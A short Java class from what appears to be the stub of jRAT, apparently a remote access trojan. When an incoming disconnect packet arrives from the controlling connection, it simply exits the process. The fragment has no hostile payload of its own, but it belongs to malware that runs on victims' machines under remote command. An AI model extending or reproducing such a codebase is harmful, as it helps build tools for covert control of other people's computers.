package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;

public class Packet11Disconnect extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		System.exit(0);
	}

}
